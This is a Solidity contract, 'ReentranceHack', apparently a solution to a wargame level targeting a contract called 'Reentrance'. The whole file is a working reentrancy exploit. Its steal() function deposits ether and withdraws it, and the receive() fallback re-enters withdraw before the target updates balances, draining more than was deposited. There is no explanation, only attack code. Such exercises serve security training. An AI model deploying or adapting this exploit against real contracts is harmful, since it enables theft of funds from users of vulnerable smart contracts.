// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import '../interfaces/IReentrance.sol';

contract ReentranceHack {

    IReentrance reentrance;
    uint withdrawInFallback;

    constructor(address _reentranceAddress) {
        reentrance = IReentrance(_reentranceAddress);
        withdrawInFallback = 0;
    }

    function steal() public payable {
        withdrawInFallback = msg.value;
        reentrance.donate{value: msg.value}(address(this));
        reentrance.withdraw(msg.value);
    }

    receive() external payable {
        if (withdrawInFallback > 0) {
            uint valueToWithdraw = withdrawInFallback;
            withdrawInFallback = 0;

            reentrance.withdraw(valueToWithdraw);
        }
    }

}
